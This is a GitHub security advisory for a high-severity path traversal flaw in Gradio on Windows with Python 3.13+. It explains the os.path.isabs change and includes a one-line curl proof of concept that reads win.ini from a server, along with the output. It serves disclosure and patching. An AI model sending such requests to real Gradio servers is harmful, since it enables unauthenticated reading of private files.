# [H] Gradio is Vulnerable to Absolute Path Traversal on Windows with Python 3.13+

## Summary
Severity: High
Advisory: GHSA-39mp-8hj3-5c49
CVE: CVE-2026-28414
CWE: CWE-22, CWE-36
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-01
Source: https://github.com/advisories/GHSA-39mp-8hj3-5c49
Type: github-advisory

## Affected
- PyPI: `gradio` — affected >=0 <6.7.0

## Details
### Summary
Gradio apps running on Window with Python 3.13+ are vulnerable to an absolute path traversal issue that enables unauthenticated attackers to read arbitrary files from the file system.

### Details
Python 3.13+ changed the definition of `os.path.isabs` so that root-relative paths like `/windows/win.ini` on Windows are no longer considered absolute paths, resulting in a vulnerability in Gradio's logic for joining paths safely.

This can be exploited by unauthenticated attackers to read arbitrary files from the Gradio server, even when Gradio is set up with authentication.

### PoC
```
% curl http://10.10.10.10:7860/static//windows/win.ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### Impact
Arbitrary file read in the context of the Windows user running Gradio.

## References
- https://github.com/gradio-app/gradio/security/advisories/GHSA-39mp-8hj3-5c49
- https://nvd.nist.gov/vuln/detail/CVE-2026-28414
- https://github.com/gradio-app/gradio/commit/6011b00d0154b85532fa901dd73cf8fa7d86fd04
- https://github.com/gradio-app/gradio
- https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2026-64.yaml
